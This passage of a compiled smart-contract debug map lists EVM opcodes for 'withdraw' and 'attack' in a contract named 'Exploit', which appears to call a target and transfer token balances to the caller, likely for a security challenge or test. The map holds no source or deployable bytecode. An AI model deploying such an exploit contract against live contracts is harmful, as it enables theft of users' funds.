      "fn": "Exploit.withdraw",
      "offset": [
        1103,
        1108
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "256": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "258": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "259": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "264": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "266": {
      "op": "SHL"
    },
    "267": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "DUP2",
      "path": "0"
    },
    "268": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "269": {
      "fn": "Exploit.withdraw",
      "offset": [
        1133,
        1137
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "270": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "272": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "DUP3",
      "path": "0"
    },
    "273": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "ADD",
      "path": "0"
    },
    "274": {
      "op": "MSTORE"
    },
    "275": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "277": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "279": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "281": {
      "op": "SHL"
    },
    "282": {
      "op": "SUB"
    },
    "283": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1093
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "284": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1093
      ],
      "op": "DUP4",
      "path": "0"
    },
    "285": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1093
      ],
      "op": "AND",
      "path": "0"
    },
    "286": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1093
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "287": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1102
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xA9059CBB"
    },
    "292": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1102
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "293": {
      "fn": "Exploit.withdraw",
      "offset": [
        1103,
        1108
      ],
      "op": "AND",
      "path": "0"
    },
    "294": {
      "fn": "Exploit.withdraw",
      "offset": [
        1103,
        1108
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "295": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1093
      ],
      "op": "DUP4",
      "path": "0"
    },
    "296": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1093
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "297": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1124
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "302": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1124
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "303": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "305": {
      "op": "ADD"
    },
    "306": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "308": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "310": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "311": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "DUP1",
      "path": "0"
    },
    "312": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "DUP4",
      "path": "0"
    },
    "313": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "SUB",
      "path": "0"
    },
    "314": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "DUP2",
      "path": "0"
    },
    "315": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "DUP7",
      "path": "0"
    },
    "316": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "DUP1",
      "path": "0"
    },
    "317": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "318": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "319": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "DUP1",
      "path": "0"
    },
    "320": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "321": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x149"
    },
    "324": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "325": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "327": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "DUP1",
      "path": "0"
    },
    "328": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "REVERT",
      "path": "0"
    },
    "329": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "330": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "POP",
      "path": "0"
    },
    "331": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "GAS",
      "path": "0"
    },
    "332": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "333": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "334": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "DUP1",
      "path": "0"
    },
    "335": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "336": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x15D"
    },
    "339": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "340": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "341": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "343": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "DUP1",
      "path": "0"
    },
    "344": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "345": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "346": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "348": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "REVERT",
      "path": "0"
    },
    "349": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "350": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "POP",
      "path": "0"
    },
    "351": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "POP",
      "path": "0"
    },
    "352": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "POP",
      "path": "0"
    },
    "353": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "POP",
      "path": "0"
    },
    "354": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "356": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "357": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "358": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "360": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "NOT",
      "path": "0"
    },
    "361": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "363": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "DUP3",
      "path": "0"
    },
    "364": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "ADD",
      "path": "0"
    },
    "365": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "AND",
      "path": "0"
    },
    "366": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "DUP3",
      "path": "0"
    },
    "367": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "ADD",
      "path": "0"
    },
    "368": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "DUP1",
      "path": "0"
    },
    "369": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "371": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "372": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "POP",
      "path": "0"
    },
    "373": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "DUP2",
      "path": "0"
    },
    "374": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "ADD",
      "path": "0"
    },
    "375": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "376": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x181"
    },
    "379": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "380": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "381": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x437"
    },
    "384": {
      "fn": "Exploit.withdraw",
      "jump": "i",
      "offset": [
        1109,
        1139
      ],
      "op": "JUMP",
      "path": "0"
    },
    "385": {
      "fn": "Exploit.withdraw",
      "offset": [
        1109,
        1139
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "386": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "388": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "389": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "391": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "393": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "395": {
      "op": "SHL"
    },
    "396": {
      "op": "SUB"
    },
    "397": {
      "op": "NOT"
    },
    "398": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "400": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "DUP6",
      "path": "0"
    },
    "401": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "402": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "SHL",
      "path": "0"
    },
    "403": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "AND",
      "path": "0"
    },
    "404": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "DUP2",
      "path": "0"
    },
    "405": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "406": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "408": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "410": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "412": {
      "op": "SHL"
    },
    "413": {
      "op": "SUB"
    },
    "414": {
      "op": "SWAP1"
    },
    "415": {
      "op": "SWAP3"
    },
    "416": {
      "op": "AND"
    },
    "417": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "419": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "DUP4",
      "path": "0"
    },
    "420": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "ADD",
      "path": "0"
    },
    "421": {
      "op": "MSTORE"
    },
    "422": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "424": {
      "op": "DUP3"
    },
    "425": {
      "op": "ADD"
    },
    "426": {
      "op": "MSTORE"
    },
    "427": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "429": {
      "op": "ADD"
    },
    "430": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "432": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "434": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "435": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "DUP1",
      "path": "0"
    },
    "436": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "DUP4",
      "path": "0"
    },
    "437": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "SUB",
      "path": "0"
    },
    "438": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "DUP2",
      "path": "0"
    },
    "439": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "441": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "DUP8",
      "path": "0"
    },
    "442": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "DUP1",
      "path": "0"
    },
    "443": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "444": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "445": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "DUP1",
      "path": "0"
    },
    "446": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "447": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1C7"
    },
    "450": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "451": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "453": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "DUP1",
      "path": "0"
    },
    "454": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "REVERT",
      "path": "0"
    },
    "455": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "456": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "POP",
      "path": "0"
    },
    "457": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "GAS",
      "path": "0"
    },
    "458": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "CALL",
      "path": "0"
    },
    "459": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "460": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "DUP1",
      "path": "0"
    },
    "461": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "462": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1DB"
    },
    "465": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "466": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "467": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "469": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "DUP1",
      "path": "0"
    },
    "470": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "471": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "472": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "474": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "REVERT",
      "path": "0"
    },
    "475": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "476": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "POP",
      "path": "0"
    },
    "477": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "POP",
      "path": "0"
    },
    "478": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "POP",
      "path": "0"
    },
    "479": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "POP",
      "path": "0"
    },
    "480": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "482": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "483": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "484": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "486": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "NOT",
      "path": "0"
    },
    "487": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "489": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "DUP3",
      "path": "0"
    },
    "490": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "ADD",
      "path": "0"
    },
    "491": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "AND",
      "path": "0"
    },
    "492": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "DUP3",
      "path": "0"
    },
    "493": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "ADD",
      "path": "0"
    },
    "494": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "DUP1",
      "path": "0"
    },
    "495": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "497": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "498": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "POP",
      "path": "0"
    },
    "499": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "DUP2",
      "path": "0"
    },
    "500": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "ADD",
      "path": "0"
    },
    "501": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "502": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1FF"
    },
    "505": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "506": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "507": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x3A6"
    },
    "510": {
      "fn": "Exploit.withdraw",
      "jump": "i",
      "offset": [
        1088,
        1140
      ],
      "op": "JUMP",
      "path": "0"
    },
    "511": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "512": {
      "fn": "Exploit.withdraw",
      "offset": [
        1088,
        1140
      ],
      "op": "POP",
      "path": "0"
    },
    "513": {
      "fn": "Exploit.withdraw",
      "jump": "o",
      "offset": [
        1051,
        1147
      ],
      "op": "JUMP",
      "path": "0"
    },
    "514": {
      "fn": "Exploit.attack",
      "offset": [
        1153,
        1453
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "515": {
      "fn": "Exploit.attack",
      "offset": [
        1246,
        1267
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 3,
      "value": "0x20B"
    },
    "518": {
      "fn": "Exploit.attack",
      "offset": [
        1260,
        1266
      ],
      "op": "DUP2",
      "path": "0"
    },
    "519": {
      "fn": "Exploit.attack",
      "offset": [
        1246,
        1259
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x341"
    },
    "522": {
      "fn": "Exploit.attack",
      "jump": "i",
      "offset": [
        1246,
        1267
      ],
      "op": "JUMP",
      "path": "0"
    },
    "523": {
      "fn": "Exploit.attack",
      "offset": [
        1246,
        1267
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "524": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1359
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 4,
      "value": "0x1"
    },
    "526": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1359
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "527": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "529": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "530": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "535": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "537": {
      "op": "SHL"
    },
    "538": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "DUP2",
      "path": "0"
    },
    "539": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "540": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "542": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "544": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "546": {
      "op": "SHL"
    },
    "547": {
      "op": "SUB"
    },
    "548": {
      "op": "DUP5"
    },
    "549": {
      "op": "DUP2"
    },
    "550": {
      "op": "AND"
    },
    "551": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "553": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "DUP4",
      "path": "0"
    },
    "554": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "ADD",
      "path": "0"
    },
    "555": {
      "op": "MSTORE"
    },
    "556": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1323
      ],
      "op": "DUP6",
      "path": "0"
    },
    "557": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1323
      ],
      "op": "DUP2",
      "path": "0"
    },
    "558": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1323
      ],
      "op": "AND",
      "path": "0"
    },
    "559": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1323
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "560": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1323
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x8D7D3EEA"
    },
    "565": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1323
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "566": {
      "fn": "Exploit.attack",
      "offset": [
        1324,
        1328
      ],
      "op": "DUP7",
      "path": "0"
    },
    "567": {
      "fn": "Exploit.attack",
      "offset": [
        1324,
        1328
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "568": {
      "fn": "Exploit.attack",
      "offset": [
        1337,
        1341
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "569": {
      "fn": "Exploit.attack",
      "offset": [
        1337,
        1341
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "570": {
      "fn": "Exploit.attack",
      "offset": [
        1343,
        1353
      ],
      "op": "CALLER",
      "path": "0"
    },
    "571": {
      "fn": "Exploit.attack",
      "offset": [
        1343,
        1353
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "572": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1359
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "573": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1359
      ],
      "op": "AND",
      "path": "0"
    },
    "574": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1359
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "575": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1369
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "580": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1369
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "581": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "583": {
      "op": "ADD"
    },
    "584": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "586": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "588": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "589": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "DUP1",
      "path": "0"
    },
    "590": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "DUP4",
      "path": "0"
    },
    "591": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "SUB",
      "path": "0"
    },
    "592": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "DUP2",
      "path": "0"
    },
    "593": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "DUP7",
      "path": "0"
    },
    "594": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "DUP1",
      "path": "0"
    },
    "595": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "596": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
